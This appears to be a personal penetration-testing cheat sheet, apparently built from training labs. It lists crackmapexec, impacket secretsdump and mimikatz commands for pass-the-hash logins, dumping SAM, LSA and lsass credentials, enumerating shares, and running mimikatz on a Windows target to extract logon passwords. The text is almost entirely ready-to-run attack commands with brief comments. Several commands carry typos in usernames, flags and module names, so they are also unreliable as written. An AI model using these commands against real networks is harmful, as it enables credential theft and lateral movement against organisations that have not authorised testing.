**Crackmapexec**:  
crackmapexec smb 10.1.1.10/24 -u fcastle -d marvel.local -p Password1  //pass the password  
crackmapexec smb 10.1.1.0/24 -u adminisrator -H NTLM:HASH --local-auth  //local auth  
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auh --sam  //dump sam  
crackmapexec smb 10.1.1.10/24 -u adminisrator -H NTLM:HASH --local-auth --lsa  //dump lsa  
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auth -M --lsassy  //revels ntlm stored in lsas //valid on top of secretsdump   
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auth --shares   //list shares  
If local admin then see Pwn3d! in output against the target !!  
cmedb  //displays db of cme with stored info  
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'   //list readable files  
When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/ipofhost  

  
**Impacket**: https://impacket.panekopanko.se/  
**Secretsdump**: works when cme doesn't work sometime against DC, because if user has dcsync perms this can still dump creds,  
however cme need local admin on target to dump !!  
secretsdump marvel.local/fcastle:'Password1'@10.1.1.1  //with domain user pass  
secretsdump administrator@10.1.1.1 -hashes NTLM:HASH   //local user hash //also reveals wdigest cleartext creds if any    


**Mimikatz**: https://wadcoms.github.io/   https://hackviser.com/tactics/tools/mimikatz  
tool to steal creds, generate kerberos tickets, pass hash attacks, silver and golden ticket attacks  
Use it where possible – Windows only -- very powerfull !!  covers more than secretsdump and cme  

Download from github gentilkiwi  
Download the latest mimikatz-trunk.zip  
Extract them on kali  
copy the 4 files into the windows target machine  or if you can downLoad it from github straight even better  
Open cmd as administartor and execute the mimikatz.exe  

Privilege::debug  //debug mode 
Securlsa::logonpasswords   //dump creds  
